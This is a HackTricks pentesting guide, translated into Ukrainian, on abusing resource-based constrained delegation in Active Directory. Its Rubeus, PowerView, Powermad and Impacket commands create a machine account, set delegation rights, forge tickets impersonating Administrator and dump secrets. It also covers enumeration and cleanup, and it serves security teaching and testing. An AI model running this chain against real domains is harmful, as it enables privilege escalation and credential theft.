# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Основи ресурсно-орієнтованої обмеженої делегації

Це схоже на базову [обмежену делегацію](constrained-delegation.md), але **замість** надання дозволів **об'єкту** на **імітування будь-якого користувача на машині**. Ресурсно-орієнтована обмежена делегація **встановлює** в **об'єкті, хто може імітувати будь-якого користувача проти нього**.

У цьому випадку обмежений об'єкт матиме атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ з ім'ям користувача, який може імітувати будь-якого іншого користувача проти нього.

Ще одна важлива відмінність цієї обмеженої делегації від інших делегацій полягає в тому, що будь-який користувач з **права на запис над обліковим записом комп'ютера** (_GenericAll/GenericWrite/WriteDacl/WriteProperty тощо_) може встановити **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (в інших формах делегації вам потрібні були права адміністратора домену).

### Нові концепції

У попередній обмеженій делегації говорилося, що **`TrustedToAuthForDelegation`** прапор у значенні _userAccountControl_ користувача потрібен для виконання **S4U2Self.** Але це не зовсім правда.\
Реальність полягає в тому, що навіть без цього значення ви можете виконати **S4U2Self** проти будь-якого користувача, якщо ви є **сервісом** (маєте SPN), але, якщо ви **маєте `TrustedToAuthForDelegation`**, повернений TGS буде **Forwardable**, а якщо ви **не маєте** цього прапора, повернений TGS **не буде** **Forwardable**.

Однак, якщо **TGS**, використаний у **S4U2Proxy**, **НЕ Forwardable**, спроба зловживання **базовою обмеженою делегацією** **не спрацює**. Але якщо ви намагаєтеся експлуатувати **ресурсно-орієнтовану обмежену делегацію, це спрацює**.

### Структура атаки

> Якщо у вас є **права на запис, еквівалентні привілеям** над **обліковим записом комп'ютера**, ви можете отримати **привілейований доступ** до цієї машини.

Припустимо, що зловмисник вже має **права на запис, еквівалентні привілеям, над комп'ютером жертви**.

1. Зловмисник **компрометує** обліковий запис, який має **SPN**, або **створює один** (“Сервіс A”). Зверніть увагу, що **будь-який** _адміністратор_ без будь-яких інших спеціальних привілеїв може **створити** до 10 об'єктів комп'ютера (**_MachineAccountQuota_**) і встановити їм **SPN**. Тож зловмисник може просто створити об'єкт комп'ютера та встановити SPN.
2. Зловмисник **зловживає своїм правом на запис** над комп'ютером жертви (СервісB), щоб налаштувати **ресурсно-орієнтовану обмежену делегацію, щоб дозволити СервісуA імітувати будь-якого користувача** проти цього комп'ютера жертви (СервісB).
3. Зловмисник використовує Rubeus для виконання **повної атаки S4U** (S4U2Self і S4U2Proxy) від Сервісу A до Сервісу B для користувача **з привілейованим доступом до Сервісу B**.
1. S4U2Self (з компрометованого/створеного облікового запису SPN): Запит на **TGS адміністратора для мене** (не Forwardable).
2. S4U2Proxy: Використовуйте **не Forwardable TGS** з попереднього кроку, щоб запитати **TGS** від **адміністратора** до **хоста жертви**.
3. Навіть якщо ви використовуєте не Forwardable TGS, оскільки ви експлуатуєте ресурсно-орієнтовану обмежену делегацію, це спрацює.
4. Зловмисник може **передати квиток** і **імітувати** користувача, щоб отримати **доступ до жертви ServiceB**.

Щоб перевірити _**MachineAccountQuota**_ домену, ви можете використовувати:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення об'єкта комп'ютера

Ви можете створити об'єкт комп'ютера в домені, використовуючи **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Налаштування делегування на основі ресурсів

**Використовуючи модуль PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Виконання повної атаки S4U (Windows/Rubeus)

По-перше, ми створили новий об'єкт комп'ютера з паролем `123456`, тому нам потрібен хеш цього пароля:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе хеші RC4 та AES для цього облікового запису.\
Тепер можна виконати атаку:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше квитків для більше сервісів, просто запитавши один раз, використовуючи параметр `/altservice` Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Зверніть увагу, що у користувачів є атрибут під назвою "**Не може бути делегований**". Якщо у користувача цей атрибут встановлено в True, ви не зможете його імплементувати. Цю властивість можна побачити в bloodhound.

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Якщо ви працюєте з Linux, ви можете виконати повний ланцюг RBCD, використовуючи офіційні інструменти Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Якщо підпис LDAP/LDAPS є обов'язковим, використовуйте `impacket-rbcd -use-ldaps ...`.
- Вибирайте ключі AES; багато сучасних доменів обмежують RC4. Impacket і Rubeus обидва підтримують лише AES потоки.
- Impacket може переписати `sname` ("AnySPN") для деяких інструментів, але отримуйте правильний SPN, коли це можливо (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accessing

Остання команда виконає **повну атаку S4U і впровадить TGS** від адміністратора до жертви в **пам'ять**.\
У цьому прикладі було запитано TGS для служби **CIFS** від адміністратора, тому ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними сервісними квитками

Дізнайтеся про [**доступні сервісні квитки тут**](silver-ticket.md#available-services).

## Перерахунок, аудит та очищення

### Перерахунок комп'ютерів з налаштованим RBCD

PowerShell (декодування SD для вирішення SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (читати або очищати одним командою):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (очистити атрибут):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що kerberos налаштовано так, щоб не використовувати DES або RC4, а ви надаєте лише хеш RC4. Надайте Rubeus принаймні хеш AES256 (або просто надайте йому хеші rc4, aes128 та aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Це означає, що час поточного комп'ютера відрізняється від часу DC, і kerberos не працює належним чином.
- **`preauth_failed`**: Це означає, що вказане ім'я користувача + хеші не працюють для входу. Можливо, ви забули вставити "$" в ім'я користувача під час генерації хешів (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Це може означати:
- Користувач, якого ви намагаєтеся видати за іншого, не може отримати доступ до бажаної служби (тому що ви не можете видати його за іншого або тому, що у нього недостатньо привілеїв)
- Запитувана служба не існує (якщо ви запитуєте квиток для winrm, але winrm не працює)
- Створений fakecomputer втратив свої привілеї над вразливим сервером, і вам потрібно їх повернути.
- Ви зловживаєте класичним KCD; пам'ятайте, що RBCD працює з непереносними квитками S4U2Self, тоді як KCD вимагає переносних.

## Notes, relays and alternatives

- Ви також можете записати RBCD SD через AD Web Services (ADWS), якщо LDAP відфільтровано. Дивіться:

{{#ref}}
adws-enumeration.md
{{#endref}}

- Ланцюги релеїв Kerberos часто закінчуються RBCD, щоб досягти локального SYSTEM за один крок. Дивіться практичні приклади від початку до кінця:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (офіційний): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Швидка шпаргалка для Linux з останнім синтаксисом: https://tldrbins.github.io/rbcd/

{{#include ../../banners/hacktricks-training.md}}
